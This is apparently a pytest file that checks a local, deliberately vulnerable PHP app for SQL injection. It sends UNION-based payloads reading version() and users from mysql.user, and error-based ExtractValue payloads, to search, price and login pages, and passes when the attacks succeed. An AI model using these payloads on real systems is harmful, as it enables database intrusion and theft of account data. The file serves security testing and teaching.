import sys
import requests


def test_find_union():
	url="http://localhost:4000/find.php?search=apple"
	attack="a' union all select version(), User from mysql.user -- -"
	finalUrl = url + attack
	r = requests.get(finalUrl)
	if r.status_code == 200:
		if "8.0.33" in str(r.text):
			assert True;
		else:
        		assert False;
	else:
       		assert False
def test_find2_union():
	url="http://localhost:4000/find2.php?search=apple"
	attack="a' union all select version(), User from mysql.user -- -"
	finalUrl = url + attack
	r = requests.get(finalUrl)
	if r.status_code == 200:
		if "8.0.33" in str(r.text):
			assert True;
		else:
        		assert False;
	else:
       		assert False
def test_find3_union():
	url="http://localhost:4000/find3.php?search=apple"
	attack="a' union all select version(), User from mysql.user -- -"
	finalUrl = url + attack
	r = requests.get(finalUrl)
	if r.status_code == 200:
		if "8.0.33" in str(r.text):
			assert True;
		else:
        		assert False;
	else:
       		assert False
def test_search_union():
	url="http://localhost:4000/search.php?search=apple"
	attack="a' union all select version(), User from mysql.user -- -"
	finalUrl = url + attack
	r = requests.get(finalUrl)
	if r.status_code == 200:
		if "8.0.33" in str(r.text):
			assert True;
		else:
        		assert False;
	else:
       		assert False;
def test_search_by_price_union():
	
	url="http://localhost:4000/search_by_price.php?max=1"
	attack="1 union all select version(), User from mysql.user -- -"
	finalUrl = url + attack
	r = requests.get(finalUrl)
	if r.status_code == 200:
		if "8.0.33" in str(r.text):
			assert True;
		else:
        		assert False;
	else:
       		assert False
def test_search_by_price2_union():
	
	url="http://localhost:4000/search_by_price2.php?max=1"
	attack="1 union all select version(), User from mysql.user -- -"
	finalUrl = url + attack
	r = requests.get(finalUrl)
	if r.status_code == 200:
		if "8.0.33" in str(r.text):
			assert True;
		else:
        		assert False;
	else:
       		assert False
def test_search_by_price3_union():
	
	url="http://localhost:4000/search_by_price3.php?max=1"
	attack="1 union all select version(),user from mysql.user -- -"
	finalUrl = url + attack
	r = requests.get(finalUrl)
	if r.status_code == 200:
		if "root" in str(r.text):
			assert True;
		else:
        		assert False;
	else:
       		assert False
def test_search_by_price4_union():
	
	url="http://localhost:4000/search_by_price4.php?max=1"
	attack="1 union all select version(), User from mysql.user -- -"
	finalUrl = url + attack
	r = requests.get(finalUrl)
	if r.status_code == 200:
		if "8.0.33" in str(r.text):
			assert True;
		else:
        		assert False;
	else:
       		assert False
def test_login_union():
	
	url="http://localhost:4000/login.php?user=admin&pass=password"
	attack="a' union select version(), user(),0,0 from mysql.user -- -"
	
	finalUrl = url + attack
	print(finalUrl)
	payload={}
	urlPart = finalUrl.split('?') 
	url = urlPart[0]  
	paramData = urlPart[1]
	params = paramData.split('&')
	for param in params:
		key = param.split('=')[0] 
		value = param.split('=')[1] 
		payload[key] = value 
	r=requests.post(url, data=payload)
	    	#Assertion for users tables
	
	if r.status_code == 200:
		if "Welcome" in str(r.text):
			assert True;
		else:
        		assert False;
	else:
       		assert False

def test_login2_union():
	
	url="http://localhost:4000/login2.php?user=admin&pass=password"
	attack="a' union select version(), user(),0,0 from mysql.user -- -"
	
	finalUrl = url + attack
	print(finalUrl)
	payload={}
	urlPart = finalUrl.split('?') 
	url = urlPart[0]  
	paramData = urlPart[1]
	params = paramData.split('&')
	
	for param in params:
		key = param.split('=')[0] 
		value = param.split('=')[1] 
		payload[key] = value 
	r=requests.post(url, data=payload)
	    	#Assertion for users tables
	
	if r.status_code == 200:
		if "Welcome" in str(r.text):
			assert True;
		else:
        		assert False;
	else:
       		assert False
def test_login3_union():
	
	url="http://localhost:4000/login3.php?user=admin&pass=password"
	attack="a' union select version(), user(),0,0 from mysql.user -- -"
	
	finalUrl = url + attack
	print(finalUrl)
	payload={}
	urlPart = finalUrl.split('?') 
	url = urlPart[0]  
	paramData = urlPart[1]
	params = paramData.split('&')
	
	for param in params:
		key = param.split('=')[0] 
		value = param.split('=')[1] 
		payload[key] = value 
	r=requests.post(url, data=payload)
	    	#Assertion for users tables
	
	if r.status_code == 200:
		if "Welcome" in str(r.text):
			assert True;
		else:
        		assert False;
	else:
       		assert False
def test_login_err():
	
	url="http://localhost:4000/login.php?user=admin&pass=password"
	attack="a' And ExtractValue(0, Concat(0x5c, user())) -- -"
	
	finalUrl = url + attack
	print(finalUrl)
	payload={}
	urlPart = finalUrl.split('?') 
	url = urlPart[0]  
	paramData = urlPart[1]
	params = paramData.split('&')
	for param in params:
		key = param.split('=')[0] 
		value = param.split('=')[1] 
		payload[key] = value 
	r=requests.post(url, data=payload)
	    	#Assertion for users tables
	
	if r.status_code == 200:
		if "XPATH" in str(r.text):
			assert True;
		else:
        		assert False;
	else:
       		assert False
def test_login2_err():
	
	url="http://localhost:4000/login2.php?user=admin&pass=password"
	attack="a' And ExtractValue(0, Concat(0x5c, user())) -- -"
	
	finalUrl = url + attack
	print(finalUrl)
	payload={}
	urlPart = finalUrl.split('?') 
	url = urlPart[0]  
	paramData = urlPart[1]
	params = paramData.split('&')
	for param in params:
		key = param.split('=')[0] 
		value = param.split('=')[1] 
		payload[key] = value 
	r=requests.post(url, data=payload)
	    	#Assertion for users tables
	
	if r.status_code == 200:
		if "XPATH" in str(r.text):
			assert True;
		else:
        		assert False;
	else:
       		assert False
def test_login3_err():
	
	url="http://localhost:4000/login3.php?user=admin&pass=password"
	attack="a' And ExtractValue(0, Concat(0x5c, user())) -- -"
	
	finalUrl = url + attack
	print(finalUrl)
	payload={}
	urlPart = finalUrl.split('?') 
	url = urlPart[0]  
	paramData = urlPart[1]
	params = paramData.split('&')
	for param in params:
		key = param.split('=')[0] 
		value = param.split('=')[1] 
		payload[key] = value 
	r=requests.post(url, data=payload)
	    	#Assertion for users tables
	
	if r.status_code == 200:
		if "XPATH" in str(r.text):
			assert True;
		else:
        		assert False;
	else:
       		assert False
def test_find_err():
	url="http://localhost:4000/find.php?search=apple"
	attack="a' And ExtractValue(0, Concat(0x5c, user())) -- -"
	finalUrl = url + attack
	r = requests.get(finalUrl)
	if r.status_code == 200:
		if "XPATH" in str(r.text):
			assert True;
		else:
        		assert False;
	
def test_find2_err():
	url="http://localhost:4000/find2.php?search=apple"
	attack="a' And ExtractValue(0, Concat(0x5c, user())) -- -"
	finalUrl = url + attack
	r = requests.get(finalUrl)
	if r.status_code == 200:
		if "XPATH" in str(r.text):
			assert True;
		else:
        		assert False;
        		
def test_find3_err():
	url="http://localhost:4000/find3.php?search=apple"
	attack="a' And ExtractValue(0, Concat(0x5c, user())) -- -"
	finalUrl = url + attack
	r = requests.get(finalUrl)
	if r.status_code == 200:
		if "XPATH" in str(r.text):
			assert True;
		else:
        		assert False;
	
def test_search_err():
	url="http://localhost:4000/search.php?search=apple"
	attack="' And ExtractValue(0, Concat(0x5c, version())) -- -"
	finalUrl = url + attack
	r = requests.get(finalUrl)
	if r.status_code == 200:
		if "XPATH" in str(r.text):
			assert True;
		else:
        		assert False;
def test_search_by_price_err():
	url="http://localhost:4000/search_by_price.php?max=1"
	attack="1 And ExtractValue(0, Concat(0x5c, user())) -- -"
	finalUrl = url + attack
	r = requests.get(finalUrl)
	if r.status_code == 200:
		if "XPATH" in str(r.text):
			assert True;
		else:
        		assert False;        		
def test_search_by_price2_err():
	url="http://localhost:4000/search_by_price2.php?max=1"
	attack="1 And ExtractValue(0, Concat(0x5c, user())) -- -"
	finalUrl = url + attack
	r = requests.get(finalUrl)
	if r.status_code == 200:
		if "XPATH" in str(r.text):
			assert True;
		else:
        		assert False;    
def test_search_by_price3_err():
	url="http://localhost:4000/search_by_price3.php?max=1"
	attack="1 And ExtractValue(0, Concat(0x5c, user())) -- -"
	finalUrl = url + attack
	r = requests.get(finalUrl)
	if r.status_code == 200:
		if "XPATH" in str(r.text):
			assert True;
		else:
        		assert False; 
def test_search_by_price4_err():
	url="http://localhost:4000/search_by_price4.php?max=1"
	attack="1 And ExtractValue(0, Concat(0x5c, user())) -- -"
	finalUrl = url + attack
	r = requests.get(finalUrl)
	if r.status_code == 200:
		if "XPATH" in str(r.text):
			assert True;
		else:
        		assert False;        		

